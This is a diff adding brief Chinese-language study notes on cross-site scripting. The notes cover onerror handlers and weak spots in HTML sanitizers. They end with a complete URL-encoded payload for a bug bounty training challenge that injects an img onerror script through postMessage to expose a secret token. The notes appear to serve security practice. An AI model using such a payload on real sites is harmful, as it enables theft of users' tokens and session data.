@@ -1,0 +1,10 @@
+
+
+onerror 是执行代码的好地方
+
+对于HTML Sanitizing,在替换的地方会出问题，重复嵌套的地方容易出错。
+
+/HallOfFame/handleupload.php
+
+
+https://www.bugbountytraining.com/challenges/challenge-11.php?url=%3Cscript%3EsetTimeout(function+()+{++++++++++++window.parent.postMessage({%22uname%22%3a%22%3Cimg+src%3d%27%27+onerror%3d%27alert(secret_token.token)%3b%27%22},%27*%27)++++},+1000)%3C/script%3Etest
